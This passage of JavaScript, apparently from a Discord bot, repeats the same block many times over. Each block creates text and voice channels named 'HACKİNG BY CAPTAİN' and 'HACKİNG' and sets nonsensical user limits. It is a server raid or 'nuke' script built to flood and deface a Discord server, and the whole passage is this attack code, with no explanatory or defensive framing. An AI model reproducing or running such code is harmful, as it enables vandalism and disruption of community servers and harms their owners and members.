    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
